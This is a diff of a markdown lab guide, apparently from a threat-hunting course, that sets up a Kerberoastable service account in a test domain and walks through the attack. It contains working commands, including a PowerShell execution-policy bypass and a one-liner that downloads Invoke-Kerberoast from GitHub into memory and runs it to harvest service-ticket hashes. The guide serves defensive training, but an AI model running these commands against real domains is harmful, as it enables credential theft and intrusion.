@@ -62,19 +62,19 @@ So now let's set up our lab environment by creating a kerberoastable account tha
 
 First of all open a new command prompt and let's make sure we have domain admin privileges, needed for creating an account in the domain. The ***password*** for DA_student = student.
 
-```
+```yaml
 runas /user:DA_student@acme.local cmd.exe
 ```
 
 Now we are running a command prompt under DA_student account.
 
-```
+```yaml
 net user /add /domain /active:yes SVC_SQL Password123!
 ```
 
 This will create a new user, activates the account and sets the password to "Password123!".
 
-```
+```yaml
 setspn -A SVC_SQL/dc.acme.local:12345 acme\SVC_sql
 ```
 
@@ -82,7 +82,7 @@ The setspn -A command will set up the SPN for the service account, in this case 
 
 Let's check if the SPN was correctly registered:
 
-```
+```yaml
 setspn -T acme -Q */*
 ```
 
@@ -95,13 +95,11 @@ setspn -T acme -Q */*
 
 Let's see which **SPN**'s exist and to which groups they belong, let try to get some parent process activity going. Open a **command** prompt:
 
-```code
+```yaml
 powershell.exe -NoP -NonI -Exec Bypass -command "c:\labs\4_KERBEROAST\GetUserSPNs.ps1"
 ```
 
-![image](./images/02_getspns.jpg)
-
->**NOTE: The labs might have different service accounts, ours won't be part of domain admins - because, well that would be too easy :)**
+![image](./images/02_getspns_pwsh.jpg)
 
 Now let's request a ticket for those SPN's, by running the one-liner below you're again doing the attack in a file-less manner by downloading the Invoke-Kerberoast powershell script directly into the memory of `powershell.exe`:
 
@@ -112,6 +110,8 @@ Open a **powershell** prompt (as Administrator):
 ```yaml
 IEX(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/crimsoncore/threathunt_student/master/labs/4_KERBEROAST/Invoke-Kerberoast.ps1");Invoke-Kerberoast
 ```
+
+![image](./images/02_Invoke_Kerb_pwsh.jpg)
 
 Let's run it locally and save the hashes, this will avoid copy/paste errors, open a **powershell** prompt:
 
